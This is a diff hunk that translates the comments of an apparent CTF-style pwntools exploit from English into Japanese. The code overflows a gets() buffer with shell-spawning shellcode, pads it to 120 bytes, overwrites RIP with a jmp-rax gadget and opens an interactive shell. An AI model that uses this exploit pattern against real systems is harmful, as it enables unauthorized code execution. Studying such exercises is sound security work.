@@ -92,9 +92,9 @@ p = process()
 
 JMP_RAX = 0x40109c
 
-payload = asm(shellcraft.sh())        # front of buffer <- RAX points here
-payload = payload.ljust(120, b'A')    # pad until RIP
-payload += p64(JMP_RAX)               # jump to the buffer - return value of gets()
+payload = asm(shellcraft.sh())        # バッファの先頭 <- RAX がここを指す
+payload = payload.ljust(120, b'A')    # RIP までパディングする
+payload += p64(JMP_RAX)               # バッファへジャンプ - gets() の戻り値
 
 p.sendline(payload)
 p.interactive()
